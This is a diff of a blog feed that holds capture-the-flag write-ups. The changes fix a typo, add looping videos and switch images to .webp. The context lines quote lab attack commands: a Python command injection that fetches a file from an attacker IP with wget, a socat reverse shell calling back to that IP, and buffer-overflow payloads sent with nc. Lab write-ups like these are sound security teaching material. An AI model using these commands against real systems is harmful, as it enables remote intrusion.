@@ -220,7 +220,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <p><code>brew_dict['abv'] = '**import**(&quot;os&quot;).system(&quot;wget http://10.10.14.15:8000/socat &quot;)'</code></p>
 <p>Then run the script:</p>
 <p><code>python3 make_shell.py</code></p>
-<p>And finally check the if our server was accessed:</p>
+<p>And finally check if our server was accessed:</p>
 
     <figure class="left" >
         <img src="image-1.webp"   />
@@ -229,7 +229,9 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="swanson.webm" loop autoplay></video>
+
 <p>Success! It's not a shell, but it's a start and confirms that I can execute commands on the machine. It's time to modify the script to have it use socat to create a reverse shell. I can do this using the following commands:</p>
 <p>Listener: <code>socat file:$(tty),raw,echo=0 tcp-listen:44226</code></p>
 <p>Victim: <code>socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:44226</code></p>
@@ -250,7 +252,9 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="2.webm" loop autoplay></video>
+
 <p>Success! But&hellip; wait&hellip; I'm root? Hmmm&hellip; that seemed very suspicious to me. I started poking around and found:</p>
 <ol>
 <li>My socat binary didn't work, has a syntax error.</li>
@@ -350,7 +354,9 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="thumbsup.webm" loop autoplay></video>
+
 <p>There's the user flag. I was almost stymied at the required passphrase on the key, but the same password Gilfoyle used for git was used here! For shame&hellip; for as much smack as Gilfoyle talks on Dinesh, he has reused his password in three places here.</p>
 <p>Now that we have a solid foothold it's time to escalate our priveleges.</p>
 <hr>
@@ -434,7 +440,9 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="success.webm" loop autoplay></video>
+
 <p>A very cool box. Until next time hackers, this is jivex5k signing off!</p>
 ]]></content>
         </item>
@@ -482,7 +490,9 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 
-<!-- raw HTML omitted -->
+
+<video src="dino.webm" loop autoplay></video>
+
 <p>That's a ton of stuff, let's save the output in Cherry Tree and start digging. First let's check out the website.
 
     <figure class="left" >
@@ -649,7 +659,7 @@ What&#39;s the return address? The return address is a value stored on the stack
 <p><code>arm-none-eabi-objdump -d a.out | grep win</code></p>
 
     <figure class="left" >
-        <img src="win_address.png"   />
+        <img src="win_address.webp"   />
 
         
             <figcaption class="center" >Memory address of win()</figcaption>
@@ -664,7 +674,7 @@ What&#39;s the return address? The return address is a value stored on the stack
 <p>When a function is called in ARM assembly, the function creates a &ldquo;stack frame&rdquo;. There's a lot of that can be said about this concept, but we can get some help using this image from Azeria Labs:</p>
 
     <figure class="left" >
-        <img src="stack.png"   />
+        <img src="stack.webp"   />
 
         
             <figcaption class="center" >Stack layout during function call.</figcaption>
@@ -682,7 +692,7 @@ What&#39;s the return address? The return address is a value stored on the stack
 <p><code>python -c 'print(&quot;\x41&quot;*132 + &quot;\xb0\x04\x01\x00&quot;)' | nc localhost 9003</code></p>
 
     <figure class="left" >
-        <img src="flag2.png"   />
+        <img src="flag2.webp"   />
 
         
             <figcaption class="center" >Overflow working.</figcaption>
@@ -889,7 +899,7 @@ No check for buffer overrun is performed (see BUGS below).
 <p><code>python -c 'print(&quot;\x00&quot;*128 + &quot;\n&quot;)' | nc localhost 9001</code></p>
 
     <figure class="left" >
-        <img src="arm_ctf_win.png"   />
+        <img src="arm_ctf_win.webp"   />
 
         
             <figcaption class="center" >Got the flag.</figcaption>
